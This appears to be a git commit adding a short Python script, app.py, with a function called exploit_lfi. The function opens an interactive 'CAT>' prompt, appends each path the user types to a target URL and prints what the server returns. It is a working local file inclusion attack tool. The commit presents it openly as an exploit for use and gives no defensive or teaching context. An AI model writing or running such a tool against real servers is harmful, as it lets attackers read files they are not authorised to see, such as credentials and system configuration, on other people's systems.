7cf336347c3544ee87f8988699f45dd3aa1ffb13
ArthurHydr <61481946+ArthurHydr@users.noreply.github.com>
2024-03-10 01:11:50 -0300

    [+] Upload file

---
+++ app.py
@@ -0,0 +1,21 @@
+import requests
+import sys
+import os
+
+def exploit_lfi(url):
+    while True:
+        command = input('CAT> ')
+        if command.lower() == 'exit':
+            break
+        elif command.lower() == 'clear':
+            os.system('clear')
+            continue
+        full_url = f'{url}/{command}'
+        response = requests.get(full_url)
+        print(response.text)
+
+if __name__ == '__main__':
+    os.system('clear')
+    url = sys.argv[1]
+    exploit_lfi(url)
+
